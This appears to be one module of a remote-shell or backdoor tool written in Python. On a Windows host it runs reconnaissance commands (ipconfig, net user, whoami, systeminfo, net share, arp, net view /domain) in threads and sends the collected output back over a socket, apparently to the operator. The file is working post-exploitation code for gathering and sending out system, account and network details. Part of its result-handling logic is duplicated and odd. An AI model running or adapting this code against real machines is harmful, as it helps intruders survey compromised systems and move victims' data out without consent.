#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
# @Author  : Cr4y0n
# @Software: PyCharm
# @Time    : 2021/4/26
# @Github  : https://github.com/Cr4y0nXX

# import os
import subprocess
from lib.dsSocket import *
from threading import Lock
from concurrent.futures import ThreadPoolExecutor, wait

class InfoGather:
    def __init__(self, clientSocket):
        self.clientSocket = clientSocket
        self.infoGather()

    def cmdExec(self, cmd):
        result = subprocess.run(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        self.lock.acquire()
        try:
            self.cmdResult += "\n>>> ".encode("gbk") + cmd.encode("gbk") + "\n".encode("gbk")
        # 判断成功执行与否，及stdout是否为空
            if result.returncode == 0:
                self.cmdResult += result.stdout if len(result.stdout) != 0 else self.cmdResult
            else:
                self.cmdResult +=  result.stderr
                if result.returncode == 0:
                    self.cmdResult += result.stdout if len(result.stdout) != 0 else self.cmdResult
                else:
                    self.cmdResult +=  result.stderr
        finally:
            self.lock.release()

    def infoGather(self):
        cmdList = [
            "ipconfig /all",
            "net user",
            "whoami",
            "systeminfo",
            "net share",
            "arp -a",
            "net view /domain",
        ]
        self.cmdResult = b""
        self.lock = Lock()
        executor = ThreadPoolExecutor(max_workers=len(cmdList))
        # executor.map(self.cmdExec, cmdList)
        all = [executor.submit(self.cmdExec, (cmd)) for cmd in cmdList]
        wait(all)
        DShellSend(self.clientSocket, self.cmdResult)